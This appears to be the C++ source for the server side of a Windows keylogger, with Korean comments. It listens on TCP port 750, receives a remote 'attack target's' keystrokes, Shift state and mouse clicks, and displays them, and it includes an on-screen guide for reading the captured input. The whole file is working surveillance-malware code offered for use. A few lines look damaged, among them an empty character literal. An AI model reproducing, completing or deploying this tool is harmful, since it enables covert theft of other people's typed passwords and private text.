#include <iostream>
#include <winsock2.h>
#include <windows.h>

#include <conio.h>

#include "RequestCode.h"
#include "textcolor.h"

using namespace std;

const char* KeyRender(char temp);
void textcolor(int foreground, int background);


int main()
{
    WSADATA wsa;
    SOCKET binding_socket, client_socket;
    struct sockaddr_in server, client_addr;
    int client_addr_size;

    char buff[50]="";

    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
    {
        cerr << " 초기화 실패. 에러코드: " << WSAGetLastError();
        return 1;
    }
    cout << " 초기화 중..." << endl;

    if((binding_socket = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
    {
        cerr << " 소켓 생성 실패. 에러코드: " << WSAGetLastError();
        WSACleanup();
        getch();
        return 1;
    }
    cout << " 소켓 생성 성공" << endl;

    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_family = AF_INET;
    server.sin_port = htons( 750 );

    int nSockOpt = 1;
    setsockopt(binding_socket, SOL_SOCKET, SO_REUSEADDR, (char*)&nSockOpt, sizeof(nSockOpt));
    if (-1 == bind (binding_socket, (struct sockaddr *) &server, sizeof (server)))
    {
        cerr << " 바인딩 에러";
        WSACleanup();
        closesocket(binding_socket);
        getch();
        exit (1);
    }
    cout << " 바인딩 성공" << endl;

    if (-1 == listen (binding_socket, 5))
    {
        cerr << " Listen 에러";
        WSACleanup();
        closesocket(binding_socket);
        getch();
        exit (1);
    }
    cout << " 바인딩 소켓에서 연결 요청을 기다리는 중..." << endl;
    cout << endl;

    client_addr_size = sizeof (client_addr);

    system("cls");
    system("mode con cols=95 lines=32");

    // ㅡㅡㅡㅡㅡㅡㅡㅡ 사용 가이드 ㅡㅡㅡㅡㅡㅡㅡㅡㅡ

    textcolor(LIGHTGREEN, BLACK);
    cout << " KeyLogger(Server) 64bit Windows Edition [1.0.1]" << endl;
    cout << " Copyright ⓒ 2018 Wonjae Ji. All rights reserved." << endl;
    cout << endl;
    cout << " ########################################## 사용법 ##########################################" << endl;
    cout << endl;
    cout << endl;
    cout << endl;
    textcolor(LIGHTCYAN, BLACK);
    cout << " Left butt Pressed: ?, ?";
    textcolor(LIGHTGREEN, BLACK);
    cout << " : 공격타켓이 마우스 왼쪽버튼을 클릭했다는 뜻" << endl;
    textcolor(LIGHTCYAN, BLACK);
    cout << " Right butt Presssed ?, ?";
    textcolor(LIGHTGREEN, BLACK);
    cout << " : 공격타켓이 마우스 오른쪽버튼을 클릭했다는 뜻" << endl;
    cout << endl;
    textcolor(LIGHTCYAN, BLACK);
    cout << " TOTOS";
    textcolor(LIGHTGREEN, BLACK);
    cout << " : 키보드로 't', 'o', 't', 'o', 's' 를 입력했다는 뜻" << endl;
    cout << " ";
    textcolor(BLACK, LIGHTGRAY);
    cout << "TOTOS";
    textcolor(LIGHTGREEN, BLACK);
    cout << " : 쉬프트를 누른 상태에서 키보드로 't', 'o', 't', 'o', 's' 를 입력했다는 뜻" << endl;
    cout << endl;
    cout << endl;
    cout << endl;
    cout << " ############################################################################################" << endl;
    cout << endl;
    cout << endl;
    cout << endl;
    cout << endl;
    cout << endl;

    // ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ

    textcolor(LIGHTCYAN, BLACK);

    const char* out;
    while(true)
    {
        if ( (client_socket = accept (binding_socket, (struct sockaddr *) &client_addr, &client_addr_size)) == -1)
        {
            cerr << " 연결 에러";
        }

        memset(buff, 0, 50);void textcolor(int foreground, int background);

        if(recv(client_socket, buff, 50, 0) < 0)
        {
            cerr << " 수신 에러" << endl;
            getch();
            return 0;
        }

        if(strlen(buff) > 1) // Key Press 이외의 이벤트인 경우
        {
            if(!strcmp(buff, "[/Shift]"))
            {
                textcolor(LIGHTCYAN, BLACK);
                continue;
            }
            cout << buff;
            continue;
        }
        else if(buff[0] == '') // 쉬프트가 눌렸으면
        {
            textcolor(BLACK, LIGHTGRAY); // 글자색을 눈에 띄게 바꿈.
            continue;
        }
        out = KeyRender(buff[0]);
        cout << out;

    }
    return 0;
}
